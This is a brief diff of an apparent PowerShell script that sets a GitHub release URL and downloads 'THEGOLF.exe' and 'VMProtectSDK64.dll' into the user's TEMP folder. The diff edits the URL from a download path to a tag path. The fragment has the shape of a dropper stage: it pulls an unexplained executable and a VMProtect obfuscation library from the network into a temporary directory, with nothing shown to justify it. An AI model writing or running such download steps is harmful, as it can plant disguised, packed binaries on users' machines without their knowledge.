@@ -1,4 +1,4 @@
-$baseUrl = "https://github.com/kosnaja12/cal/releases/download/tata"
+$baseUrl = "https://github.com/kosnaja12/cal/releases/tag/tata"
 
 iwr "$baseUrl/THEGOLF.exe" -OutFile "$env:TEMP\THEGOLF.exe"
 iwr "$baseUrl/VMProtectSDK64.dll" -OutFile "$env:TEMP\VMProtectSDK64.dll"
